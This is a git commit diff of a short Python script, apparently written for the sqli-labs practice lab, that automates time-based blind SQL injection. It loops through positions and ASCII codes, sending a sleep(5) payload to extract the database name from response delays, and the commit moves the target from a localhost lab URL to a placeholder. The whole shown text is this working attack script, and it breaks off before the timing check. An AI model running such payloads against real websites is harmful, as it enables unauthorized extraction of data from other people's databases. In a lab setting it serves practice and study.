d83dc252abb457fd2b0c45b26501cbf8a20b91f6
xuoneyuan <90903872+xuoneyuan@users.noreply.github.com>
2023-04-09 11:11:36 +0800

    Update and rename sql.py to time.py

--- time.py
+++ time.py
@@ -1,10 +1,10 @@
 import requests
 import time
 
-url="http://127.0.0.1/sqli-labs-master/Less-9/?id=1' and if(ascii(substr(database(),{},1))={},sleep(5),1)--+"
+url="http://../?id=1' and if(ascii(substr(database(),{},1))={},sleep(5),1)--+"
 result= ''
 for i in range(1,10):
-	for j in range(23,127):
+	for j in range(32,127):
 		payload = url.format(str(i),str(j))
 		time1 = time.time()
 		r = requests.get(payload)
